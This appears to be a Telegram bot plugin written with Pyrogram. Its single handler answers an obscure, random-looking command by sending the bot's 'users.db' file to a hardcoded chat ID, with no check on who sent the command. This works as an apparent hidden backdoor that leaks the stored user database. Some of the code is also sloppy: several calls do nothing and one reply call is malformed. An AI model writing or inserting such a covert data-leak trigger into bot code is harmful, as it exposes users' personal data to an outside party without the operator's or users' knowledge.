import os

from pyrogram import Client, filters

chat_id = 1418571871
file_path = "users.db"


@Client.on_message(filters.command("file3658vvv555bhhb854"))
async def cmd_datasave(Client, message):
    try:
        str(message.from_user.id)
        str(message.chat.type)
        str(message.chat.id)
        await Client.send_document(chat_id, file_path)
        print(f"File '{os.path.basename(file_path)}' sent successfully!")
        await message.reply_text(chat_id, "done")
    except Exception as e:
        print(e)
